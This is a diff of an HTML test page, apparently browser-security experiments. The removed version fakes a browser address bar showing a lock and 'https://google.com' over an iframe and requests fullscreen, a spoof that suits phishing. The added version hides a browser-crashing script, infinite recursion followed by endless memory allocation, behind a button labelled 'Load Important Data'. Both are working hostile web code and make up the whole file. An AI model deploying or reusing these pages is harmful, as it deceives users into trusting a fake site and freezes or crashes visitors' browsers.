@@ -1,215 +1,27 @@
-<!!DOCTYPE html>
-
-
-
+<!DOCTYPE html>
 <html>
-
-
-<head>
-
-
-  <title>Secure Login</title>
-
-
-  <style>
-
-
-    html, body {
-
-
-      margin: 0;
-
-
-      padding: 0;
-
-
-      overflow: hidden;
-
-
-      font-family: sans-serif;
-
-
-      background: #ffffff;
-
-
-    }
-
-
-    .addressbar-spoof {
-
-
-      position: fixed;
-
-
-      top: 0;
-
-
-      left: 0;
-
-
-      height: 40px;
-
-
-      width: 100%;
-
-
-      background: #f1f1f1;
-
-
-      display: flex;
-
-
-      align-items: center;
-
-
-      padding-left: 10px;
-
-
-      font-size: 14px;
-
-
-      z-index: 9999;
-
-
-    }
-
-
-    .secure {
-
-
-      color: green;
-
-
-      font-weight: bold;
-
-
-      margin-right: 6px;
-
-
-    }
-
-
-    iframe {
-
-
-      position: absolute;
-
-
-      top: 40px;
-
-
-      left: 0;
-
-
-      width: 100%;
-
-
-      height: calc(100% - 40px);
-
-
-      border: none;
-
-
-    }
-
-
-    #trigger {
-
-
-      position: absolute;
-
-
-      top: 50%;
-
-
-      left: 50%;
-
-
-      transform: translate(-50%, -50%);
-
-
-      font-size: 18px;
-
-
-      padding: 20px;
-
-
-      background: #111;
-
-
-      color: white;
-
-
-      border: none;
-
-
-      cursor: pointer;
-
-
-    }
-
-
-  </style>
-
-
-</head>
-
-
 <body>
-
-
-
-
-
-<button id="trigger">Navigate to google.com</button>
-
-
-
-
+<button onclick="magic3()">Load Important Data</button>
 
 <script>
-
-
-  const trigger = document.getElementById("trigger");
-
-
-
-
-
-  trigger.onclick = () => {
-
-
-    document.body.innerHTML = `
-
-
-      <div class="addressbar-spoof">
-
-
-        <span class="secure">🔒</span> https://google.com
-
-
-      </div>
-
-
-      <iframe src="test3.html"></iframe>
-
-
-    `;
-
-
-    document.documentElement.requestFullscreen().catch(console.error);
-
-
-  };
-
-
+function magic3() {
+    // Recursive function yang cause stack overflow
+    function crash() {
+        crash();
+    }
+    
+    // Multiple approach crash
+    try {
+        // Method 1: Stack overflow
+        crash();
+    } catch(e) {
+        // Method 2: Memory exhaustion
+        const arr = [];
+        while(true) {
+            arr.push(new Array(1000000));
+        }
+    }
+}
 </script>
-
-
-
-
-
 </body>
-
-
 </html>
